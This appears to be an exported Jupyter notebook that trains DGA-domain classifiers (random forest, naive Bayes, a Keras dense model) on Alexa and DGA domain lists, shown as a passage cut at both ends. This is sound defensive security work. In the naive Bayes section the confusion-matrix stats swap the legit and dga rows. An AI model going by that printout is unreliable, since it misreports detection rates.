}\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      class\n      length\n      entropy\n      alexa_grams\n      word_grams\n      diff\n    \n  \n  \n    \n      79366\n      bipolardisorderdepressionanxiety\n      legit\n      32\n      3.616729\n      117.312465\n      190.833856\n      -73.521391\n    \n    \n      72512\n      channel4embarrassingillnesses\n      legit\n      29\n      3.440070\n      95.786979\n      169.119440\n      -73.332460\n    \n    \n      10961\n      stirringtroubleinternationally\n      legit\n      30\n      3.481728\n      134.049367\n      207.204729\n      -73.155362\n    \n    \n      85031\n      americansforresponsiblesolutions\n      legit\n      32\n      3.667838\n      148.143049\n      218.363956\n      -70.220908\n    \n    \n      20459\n      pragmatismopolitico\n      legit\n      19\n      3.326360\n      61.244630\n      121.536223\n      -60.291593\n    \n    \n      13702\n      egaliteetreconciliation\n      legit\n      23\n      3.186393\n      91.938518\n      152.125325\n      -60.186808\n    \n    \n      4706\n      interoperabilitybridges\n      legit\n      23\n      3.588354\n      95.037285\n      153.626312\n      -58.589028\n    \n    \n      85161\n      foreclosurephilippines\n      legit\n      22\n      3.447402\n      74.506548\n      132.514638\n      -58.008090\n    \n    \n      45636\n      annamalicesissyselfhypnosis\n      legit\n      27\n      3.429908\n      68.680068\n      126.667692\n      -57.987623\n    \n    \n      70351\n      corazonindomablecapitulos\n      legit\n      25\n      3.813661\n      75.535473\n      133.160690\n      -57.625217\n    \n  \n\n\n\n\n\n\nall_domains.sort_values([&#x27;diff&#x27;], ascending=False).head(10)\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      class\n      length\n      entropy\n      alexa_grams\n      word_grams\n      diff\n    \n  \n  \n    \n      54228\n      gay-sex-pics-porn-pictures-gay-sex-porn-gay-se...\n      legit\n      56\n      3.661056\n      159.642301\n      85.124184\n      74.518116\n    \n    \n      85091\n      article-directory-free-submission-free-content\n      legit\n      46\n      3.786816\n      235.233896\n      188.230453\n      47.003443\n    \n    \n      16893\n      stream-free-movies-online\n      legit\n      25\n      3.509275\n      120.250616\n      74.496915\n      45.753701\n    \n    \n      63380\n      watch-free-movie-online\n      legit\n      23\n      3.708132\n      103.029245\n      58.943451\n      44.085794\n    \n    \n      44253\n      best-online-shopping-site\n      legit\n      25\n      3.452879\n      123.377240\n      79.596640\n      43.780601\n    \n    \n      22524\n      social-bookmarking-sites-list\n      legit\n      29\n      3.702472\n      145.755266\n      102.261826\n      43.493440\n    \n    \n      66335\n      free-online-directory\n      legit\n      21\n      3.403989\n      123.379738\n      80.735030\n      42.644708\n    \n    \n      46553\n      free-links-articles-directory\n      legit\n      29\n      3.702472\n      153.239055\n      110.955361\n      42.283694\n    \n    \n      59873\n      online-web-directory\n      legit\n      20\n      3.584184\n      116.310717\n      74.082948\n      42.227769\n    \n    \n      58016\n      web-directory-online\n      legit\n      20\n      3.584184\n      114.402671\n      74.082948\n      40.319723\n    \n  \n\n\n\n\n\n\n#gram count低的词weird_cond = (all_domains[&#x27;class&#x27;]==&#x27;legit&#x27;) &amp; (all_domains[&#x27;word_grams&#x27;]&lt;3) &amp; (all_domains[&#x27;alexa_grams&#x27;]&lt;2)weird = all_domains[weird_cond]print(weird.shape[0])weird.head(10)\n\n91\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      class\n      length\n      entropy\n      alexa_grams\n      word_grams\n      diff\n    \n  \n  \n    \n      1246\n      twcczhu\n      legit\n      7\n      2.521641\n      1.748188\n      0.0\n      1.748188\n    \n    \n      2009\n      ggmm777\n      legit\n      7\n      1.556657\n      1.518514\n      0.0\n      1.518514\n    \n    \n      2760\n      qq66699\n      legit\n      7\n      1.556657\n      1.342423\n      0.0\n      1.342423\n    \n    \n      17347\n      crx7601\n      legit\n      7\n      2.807355\n      0.000000\n      0.0\n      0.000000\n    \n    \n      18682\n      hzsxzhyy\n      legit\n      8\n      2.250000\n      0.000000\n      0.0\n      0.000000\n    \n    \n      19418\n      02022222222\n      legit\n      11\n      0.684038\n      1.041393\n      0.0\n      1.041393\n    \n    \n      19887\n      3181302\n      legit\n      7\n      2.235926\n      0.000000\n      0.0\n      0.000000\n    \n    \n      21172\n      hljdns4\n      legit\n      7\n      2.807355\n      1.755875\n      0.0\n      1.755875\n    \n    \n      26441\n      05tz2e9\n      legit\n      7\n      2.807355\n      0.000000\n      0.0\n      0.000000\n    \n    \n      26557\n      fzysqmy\n      legit\n      7\n      2.521641\n      1.176091\n      0.0\n      1.176091\n    \n  \n\n\n\n\n\n\n#对于这些正常但是gram count低的domain标记为weirdall_domains.loc[weird_cond, &#x27;class&#x27;] = &#x27;weird&#x27;all_domains[&#x27;class&#x27;].value_counts()\n\n\n\n\nlegit    67221\ndga       2664\nweird       91\nName: class, dtype: int64\n\nall_domains[all_domains[&#x27;class&#x27;] == &#x27;weird&#x27;].head()\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      class\n      length\n      entropy\n      alexa_grams\n      word_grams\n      diff\n    \n  \n  \n    \n      1246\n      twcczhu\n      weird\n      7\n      2.521641\n      1.748188\n      0.0\n      1.748188\n    \n    \n      2009\n      ggmm777\n      weird\n      7\n      1.556657\n      1.518514\n      0.0\n      1.518514\n    \n    \n      2760\n      qq66699\n      weird\n      7\n      1.556657\n      1.342423\n      0.0\n      1.342423\n    \n    \n      17347\n      crx7601\n      weird\n      7\n      2.807355\n      0.000000\n      0.0\n      0.000000\n    \n    \n      18682\n      hzsxzhyy\n      weird\n      8\n      2.250000\n      0.000000\n      0.0\n      0.000000\n    \n  \n\n\n\n\n\n\ncond = all_domains[&#x27;class&#x27;] == &#x27;dga&#x27;dga = all_domains[cond]alexa = all_domains[~cond]plt.scatter(alexa[&#x27;word_grams&#x27;], alexa[&#x27;entropy&#x27;], s=140, c=&#x27;#aaaaff&#x27;, label=&#x27;Alexa&#x27;, alpha=.2)plt.scatter(dga[&#x27;word_grams&#x27;], dga[&#x27;entropy&#x27;], s=40, c=&#x27;r&#x27;, label=&#x27;DGA&#x27;, alpha=.3)plt.legend()#放置图例pylab.xlabel(&#x27;Domain word_grams&#x27;)pylab.ylabel(&#x27;Domain Entropy&#x27;)\n\n\n\n\nText(0,0.5,&#39;Domain Entropy&#39;)\n\n\n训练算法\nnot_weird = all_domains[all_domains[&#x27;class&#x27;] != &#x27;weird&#x27;]X = not_weird.as_matrix([&#x27;length&#x27;, &#x27;entropy&#x27;, &#x27;alexa_grams&#x27;, &#x27;word_grams&#x27;])#将frame转换为Numpy-array表示y = np.array(not_weird[&#x27;class&#x27;].tolist())#将array转换为listclf = sklearn.ensemble.RandomForestClassifier(n_estimators=20)#A random forest classifier#The number of trees in the forestX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)#随机划分训练集和测试集#样本占比0.2clf.fit(X_train, y_train)#用训练数据拟合分类器模型y_pred = clf.predict(X_test)#用训练好的分类器去预测测试数据\n\n/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/ipykernel_launcher.py:2: FutureWarning: Method .as_matrix will be removed in a future version. Use .values instead.\n  \n\ndef show_cm(cm, labels):    #计算百分比    percent = (cm*100.0)/np.array(np.matrix(cm.sum(axis=1)).T)      print(&#x27;Confusion Matrix Stats&#x27;)    for i, label_i in enumerate(labels):        for j, label_j in enumerate(labels):            print(&quot;%s/%s: %.2f%% (%d/%d)&quot; % (label_i, label_j, (percent[i][j]), cm[i][j], cm[i].sum()))\n\n\nlabels = [&#x27;legit&#x27;, &#x27;dga&#x27;]cm = sklearn.metrics.confusion_matrix(y_test, y_pred, labels)#混淆矩阵被用于在分类问题上对准确率的一种评估形式show_cm(cm, labels)\n\nConfusion Matrix Stats\nlegit/legit: 99.57% (13369/13427)\nlegit/dga: 0.43% (58/13427)\ndga/legit: 15.45% (85/550)\ndga/dga: 84.55% (465/550)\n\nimportances = zip([&#x27;length&#x27;, &#x27;entropy&#x27;, &#x27;alexa_grams&#x27;, &#x27;word_grams&#x27;], clf.feature_importances_)#了解每个特征的重要性list(importances)\n\n\n\n\n[(&#39;length&#39;, 0.16033779891739047),\n (&#39;entropy&#39;, 0.12175502861193326),\n (&#39;alexa_grams&#39;, 0.5087685303664589),\n (&#39;word_grams&#39;, 0.20913864210421748)]\n\nclf.fit(X, y)\n\n\n\n\nRandomForestClassifier(bootstrap=True, class_weight=None, criterion=&#39;gini&#39;,\n            max_depth=None, max_features=&#39;auto&#39;, max_leaf_nodes=None,\n            min_impurity_decrease=0.0, min_impurity_split=None,\n            min_samples_leaf=1, min_samples_split=2,\n            min_weight_fraction_leaf=0.0, n_estimators=20, n_jobs=1,\n            oob_score=False, random_state=None, verbose=0,\n            warm_start=False)\n\n测试算法\ndef test_it(domain):    _alexa_match = alexa_counts * alexa_vc.transform([domain]).T      _dict_match = dict_counts * dict_vc.transform([domain]).T    _X = [[len(domain), entropy(domain), _alexa_match, _dict_match]]    print(&#x27;%s : %s&#x27; % (domain, clf.predict(_X)[0]))\n\n\ntest_it(&#x27;google&#x27;)test_it(&#x27;google8sdflkajssjgjksdh&#x27;)test_it(&#x27;faceboosadfadfafdk&#x27;)test_it(&#x27;1cb8a5f36f&#x27;)test_it(&#x27;pterodactyladfasdfasdffarts&#x27;)test_it(&#x27;ptes9dro-dwacty2lfa5rrts&#x27;)test_it(&#x27;beyonce&#x27;)test_it(&#x27;bey666on4ce&#x27;)test_it(&#x27;supersexy&#x27;)test_it(&#x27;yourmomissohotinthesummertime&#x27;)\n\ngoogle : legit\ngoogle8sdflkajssjgjksdh : dga\nfaceboosadfadfafdk : legit\n1cb8a5f36f : dga\npterodactyladfasdfasdffarts : legit\nptes9dro-dwacty2lfa5rrts : dga\nbeyonce : legit\nbey666on4ce : dga\nsupersexy : legit\nyourmomissohotinthesummertime : legit\n\n使用算法\ndef save_model_to_disk(name, model, model_dir=&#x27;models&#x27;):    serialized_model = pickle.dumps(model, protocol=pickle.HIGHEST_PROTOCOL)    model_path = os.path.join(model_dir, name+&#x27;.model&#x27;)    print(&#x27;Storing Serialized Model to Disk (%s:%.2fMeg)&#x27; % (name, len(serialized_model)/1024.0/1024.0))    open(model_path,&#x27;wb&#x27;).write(serialized_model)\n\n\nsave_model_to_disk(&#x27;dga_model_random_forest&#x27;, clf)save_model_to_disk(&#x27;dga_model_alexa_vectorizor&#x27;, alexa_vc)save_model_to_disk(&#x27;dga_model_alexa_counts&#x27;, alexa_counts)save_model_to_disk(&#x27;dga_model_dict_vectorizor&#x27;, dict_vc)save_model_to_disk(&#x27;dga_model_dict_counts&#x27;, dict_counts)\n\nStoring Serialized Model to Disk (dga_model_random_forest:1.80Meg)\nStoring Serialized Model to Disk (dga_model_alexa_vectorizor:2.93Meg)\nStoring Serialized Model to Disk (dga_model_alexa_counts:0.18Meg)\nStoring Serialized Model to Disk (dga_model_dict_vectorizor:5.39Meg)\nStoring Serialized Model to Disk (dga_model_dict_counts:0.94Meg)\n\ndef load_model_from_disk(name, model_dir=&#x27;models&#x27;):    model_path = os.path.join(model_dir, name+&#x27;.model&#x27;)    try:        model = pickle.loads(open(model_path,&#x27;rb&#x27;).read())        print(&#x27;success&#x27;)    except:        print(&#x27;Could not load model: %s from directory %s!&#x27; % (name, model_path))        return None    return model\n\n\nclf = load_model_from_disk(&#x27;dga_model_random_forest&#x27;)alexa_vc = load_model_from_disk(&#x27;dga_model_alexa_vectorizor&#x27;)alexa_counts = load_model_from_disk(&#x27;dga_model_alexa_counts&#x27;)dict_vc = load_model_from_disk(&#x27;dga_model_dict_vectorizor&#x27;)dict_counts = load_model_from_disk(&#x27;dga_model_dict_counts&#x27;)model = &#123;&#x27;clf&#x27;:clf, &#x27;alexa_vc&#x27;:alexa_vc, &#x27;alexa_counts&#x27;:alexa_counts,                 &#x27;dict_vc&#x27;:dict_vc, &#x27;dict_counts&#x27;:dict_counts&#125;\n\nsuccess\nsuccess\nsuccess\nsuccess\nsuccess\n\ndef evaluate_url(model, url):    domain = domain_extract(url)    alexa_match = model[&#x27;alexa_counts&#x27;] * model[&#x27;alexa_vc&#x27;].transform([url]).T    dict_match = model[&#x27;dict_counts&#x27;] * model[&#x27;dict_vc&#x27;].transform([url]).T        X = [[len(domain), entropy(domain), alexa_match, dict_match]]    y_pred = model[&#x27;clf&#x27;].predict(X)[0]        print(&#x27;%s : %s&#x27; % (domain, y_pred))\n\n\nevaluate_url(model, &#x27;adfhalksfhjashfk.com&#x27;)\n\nadfhalksfhjashfk : dga\n\n\nmtnb = MultinomialNB()mtnb.fit(X_train,y_train)\n\n\n\n\nMultinomialNB(alpha=1.0, class_prior=None, fit_prior=True)\n\nnb_y_pred=mtnb.predict(X_test)print(classification_report(y_test, nb_y_pred))cm = sklearn.metrics.confusion_matrix(y_test, nb_y_pred)show_cm(cm, labels)\n\n             precision    recall  f1-score   support\n\n        dga       0.71      0.87      0.78       550\n      legit       0.99      0.99      0.99     13427\n\navg / total       0.98      0.98      0.98     13977\n\nConfusion Matrix Stats\nlegit/legit: 86.73% (477/550)\nlegit/dga: 13.27% (73/550)\ndga/legit: 1.44% (194/13427)\ndga/dga: 98.56% (13233/13427)\n\nimport osimport randomimport tldextractimport sklearnimport pandas as pdimport numpy as npfrom keras.models import Sequential, load_modelfrom keras.preprocessing import sequencefrom keras.layers.core import Dense, Dropout, Activationfrom keras.layers.embeddings import Embeddingfrom keras.layers.recurrent import LSTMfrom sklearn import feature_extractionfrom sklearn.model_selection import train_test_splitfrom datetime import datetimefrom zipfile import ZipFile\n\n\nalexa_dataframe = pd.read_csv(&#x27;data/top-1m.csv&#x27;, names=[&#x27;rank&#x27;,&#x27;uri&#x27;], header=None, encoding=&#x27;utf-8&#x27;)alexa_dataframe.info()alexa_dataframe.head()\n\n&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;\nRangeIndex: 1000000 entries, 0 to 999999\nData columns (total 2 columns):\nrank    1000000 non-null int64\nuri     1000000 non-null object\ndtypes: int64(1), object(1)\nmemory usage: 15.3+ MB\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      rank\n      uri\n    \n  \n  \n    \n      0\n      1\n      google.com\n    \n    \n      1\n      2\n      youtube.com\n    \n    \n      2\n      3\n      facebook.com\n    \n    \n      3\n      4\n      baidu.com\n    \n    \n      4\n      5\n      wikipedia.org\n    \n  \n\n\n\n\n\n\ndef load_data_set(filename):    fw = open(&#x27;data/dga_domain.txt&#x27;, &#x27;w+&#x27;)    with open(filename, &quot;r&quot;) as f:        for line in f.readlines():            lineArr = line.strip().split(&#x27;\\t&#x27;)            fw.write(lineArr[1] + &#x27;\\n&#x27;)    fw.close()load_data_set(&#x27;data/dga.txt&#x27;)\n\n\ndga_dataframe = pd.read_csv(&#x27;data/dga_domain.txt&#x27;, names=[&#x27;raw_domain&#x27;], header=None, encoding=&#x27;utf-8&#x27;)dga_dataframe.info()dga_dataframe.head()\n\n&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;\nRangeIndex: 1158695 entries, 0 to 1158694\nData columns (total 1 columns):\nraw_domain    1158695 non-null object\ndtypes: object(1)\nmemory usage: 8.8+ MB\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      raw_domain\n    \n  \n  \n    \n      0\n      ogxbnjopz.biz\n    \n    \n      1\n      zyejwiist.net\n    \n    \n      2\n      buuqogz.com\n    \n    \n      3\n      vpjmomduqll.org\n    \n    \n      4\n      uakwifutnpn.biz\n    \n  \n\n\n\n\n\n\ndef domain_extract(uri):    ext = tldextract.extract(uri)    if (not ext.suffix):        return None    else:        return ext.domain    alexa_dataframe[&#x27;domain&#x27;] = [ domain_extract(uri) for uri in alexa_dataframe[&#x27;uri&#x27;]]del alexa_dataframe[&#x27;rank&#x27;]del alexa_dataframe[&#x27;uri&#x27;]alexa_dataframe = alexa_dataframe.dropna()alexa_dataframe = alexa_dataframe.drop_duplicates()alexa_dataframe[&#x27;length&#x27;] = [len(x) for x in alexa_dataframe[&#x27;domain&#x27;]]alexa_dataframe = alexa_dataframe[alexa_dataframe[&#x27;length&#x27;] &gt; 6]alexa_dataframe.info()alexa_dataframe.head()\n\n&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;\nInt64Index: 718018 entries, 1 to 999999\nData columns (total 2 columns):\ndomain    718018 non-null object\nlength    718018 non-null int64\ndtypes: int64(1), object(1)\nmemory usage: 16.4+ MB\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      length\n    \n  \n  \n    \n      1\n      youtube\n      7\n    \n    \n      2\n      facebook\n      8\n    \n    \n      4\n      wikipedia\n      9\n    \n    \n      11\n      instagram\n      9\n    \n    \n      13\n      twitter\n      7\n    \n  \n\n\n\n\n\n\nalexa_dataframe[&#x27;class&#x27;] = &#x27;legit&#x27;#对正常数据打标legitalexa_dataframe.head()\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      length\n      class\n    \n  \n  \n    \n      1\n      youtube\n      7\n      legit\n    \n    \n      2\n      facebook\n      8\n      legit\n    \n    \n      4\n      wikipedia\n      9\n      legit\n    \n    \n      11\n      instagram\n      9\n      legit\n    \n    \n      13\n      twitter\n      7\n      legit\n    \n  \n\n\n\n\n\n\n# Shuffle the data (important for training/testing)alexa_dataframe = alexa_dataframe.reindex(np.random.permutation(alexa_dataframe.index))#打乱循序，重新索引#Randomly permute a sequence, or return a permuted rangealexa_total = alexa_dataframe.shape[0]print(&#x27;Total Alexa domains %d&#x27; % alexa_total)\n\nTotal Alexa domains 718018\n\ndga_dataframe[&#x27;domain&#x27;] = dga_dataframe.applymap(lambda x: x.split(&#x27;.&#x27;)[0].strip().lower())#This method applies a function that accepts and returns a scalar to every element of a DataFrame.del dga_dataframe[&#x27;raw_domain&#x27;]\n\n\ndga_dataframe = dga_dataframe.dropna()dga_dataframe = dga_dataframe.drop_duplicates()dga_dataframe[&#x27;length&#x27;] = [len(x) for x in dga_dataframe[&#x27;domain&#x27;]]dga_dataframe = dga_dataframe[dga_dataframe[&#x27;length&#x27;] &gt; 6]dga_total = dga_dataframe.shape[0]print(&#x27;Total DGA domains %d&#x27; % dga_total)\n\nTotal DGA domains 1082010\n\ndga_dataframe[&#x27;class&#x27;] = &#x27;dga&#x27;dga_dataframe.head()\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      length\n      class\n    \n  \n  \n    \n      0\n      ogxbnjopz\n      9\n      dga\n    \n    \n      1\n      zyejwiist\n      9\n      dga\n    \n    \n      2\n      buuqogz\n      7\n      dga\n    \n    \n      3\n      vpjmomduqll\n      11\n      dga\n    \n    \n      4\n      uakwifutnpn\n      11\n      dga\n    \n  \n\n\n\n\n\n\nall_domains = pd.concat([alexa_dataframe[:5000], dga_dataframe[:5000]], ignore_index=True)#all_domains.head(10)\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      length\n      class\n    \n  \n  \n    \n      0\n      youtube\n      7\n      legit\n    \n    \n      1\n      facebook\n      8\n      legit\n    \n    \n      2\n      wikipedia\n      9\n      legit\n    \n    \n      3\n      instagram\n      9\n      legit\n    \n    \n      4\n      twitter\n      7\n      legit\n    \n    \n      5\n      blogspot\n      8\n      legit\n    \n    \n      6\n      netflix\n      7\n      legit\n    \n    \n      7\n      pornhub\n      7\n      legit\n    \n    \n      8\n      xvideos\n      7\n      legit\n    \n    \n      9\n      livejasmin\n      10\n      legit\n    \n  \n\n\n\n\n\n\nall_domains.tail(10)\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      length\n      class\n    \n  \n  \n    \n      9990\n      mxepwpxki\n      9\n      dga\n    \n    \n      9991\n      xnvqgaddhivrqowtbs\n      18\n      dga\n    \n    \n      9992\n      btgjyoydcwoeigdldngr\n      20\n      dga\n    \n    \n      9993\n      mnnridfyhxkyk\n      13\n      dga\n    \n    \n      9994\n      jmcctiodbdemfejo\n      16\n      dga\n    \n    \n      9995\n      mepoiwtmeffy\n      12\n      dga\n    \n    \n      9996\n      iwpikrmppfqeere\n      15\n      dga\n    \n    \n      9997\n      gcibdmrs\n      8\n      dga\n    \n    \n      9998\n      tusdspujigdyntbxusuah\n      21\n      dga\n    \n    \n      9999\n      wvsiuqhblxfijnoefjnao\n      21\n      dga\n    \n  \n\n\n\n\n\n\nX = all_domains[&#x27;domain&#x27;]labels = all_domains[&#x27;class&#x27;]\n\n\nngram_vectorizer = feature_extraction.text.CountVectorizer(analyzer=&#x27;char&#x27;, ngram_range=(2, 2))count_vec = ngram_vectorizer.fit_transform(X)max_features = count_vec.shape[1]\n\n\ny = [0 if x == &#x27;legit&#x27; else 1 for x in labels]\n\n\nfinal_data = []\n\n多层感知机（MLP）def build_model(max_features):    model = Sequential()    model.add(Dense(1, input_dim=max_features, activation=&#x27;sigmoid&#x27;))    #添加一个全连接层，激活函数使用sigmoid，输出维度max_features    model.compile(loss=&#x27;binary_crossentropy&#x27;,optimizer=&#x27;adam&#x27;)    #编译模型，损失函数采用对数损失函数，优化器选用adam    return model\n\n\nmax_epoch = 50nfolds = 10#10轮训练batch_size = 128\n\n\nfor fold in range(nfolds):    print(&quot;fold %u/%u&quot; % (fold+1, nfolds))    X_train, X_test, y_train, y_test, _, label_test = train_test_split(count_vec, y, labels, test_size=0.2)    print(&#x27;Build model...&#x27;)    model = build_model(max_features)    print(&quot;Train...&quot;)    X_train, X_holdout, y_train, y_holdout = train_test_split(X_train, y_train, test_size=0.05)    best_iter = -1    best_auc = 0.0    out_data = &#123;&#125;    for ep in range(max_epoch):        model.fit(X_train.todense(), y_train, batch_size=batch_size, nb_epoch=1)        t_probs = model.predict_proba(X_holdout.todense())        t_auc = sklearn.metrics.roc_auc_score(y_holdout, t_probs)        #计算AUC值        print(&#x27;Epoch %d: auc = %f (best=%f)&#x27; % (ep, t_auc, best_auc))        if t_auc &gt; best_auc:            best_auc = t_auc            best_iter = ep            probs = model.predict_proba(X_test.todense())            out_data = &#123;&#x27;y&#x27;:y_test, &#x27;labels&#x27;: label_test, &#x27;probs&#x27;:probs, &#x27;epochs&#x27;: ep,                            &#x27;confusion_matrix&#x27;: sklearn.metrics.confusion_matrix(y_test, probs &gt; .5)&#125;            print(sklearn.metrics.confusion_matrix(y_test, probs &gt; .5))        else:            if (ep-best_iter) &gt; 5:                break    final_data.append(out_data)    model.save(&#x27;model.h5&#x27;)\n\nfold 1/10\nBuild model...\nTrain...\n\n\n/usr/lib/python3/dist-packages/ipykernel_launcher.py:15: UserWarning: The `nb_epoch` argument in `fit` has been renamed `epochs`.\n  from ipykernel import kernelapp as app\n\n\nEpoch 1/1\n7600/7600 [==============================] - 1s 86us/step - loss: 0.6297\nEpoch 0: auc = 0.950239 (best=0.000000)\n[[915  86]\n [108 891]]\nEpoch 1/1\n7600/7600 [==============================] - 0s 26us/step - loss: 0.5243\nEpoch 1: auc = 0.980196 (best=0.950239)\n[[952  49]\n [ 83 916]]\nEpoch 1/1\n7600/7600 [==============================] - 0s 31us/step - loss: 0.4502\nEpoch 2: auc = 0.984872 (best=0.980196)\n[[965  36]\n [ 78 921]]\nEpoch 1/1\n7600/7600 \n\nEpoch 32: auc = 0.994192 (best=0.994192)\n\nmodel = load_model(&#x27;model.h5&#x27;)\n\n\nprint(final_data)\n\n[&#123;&#39;y&#39;: [0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 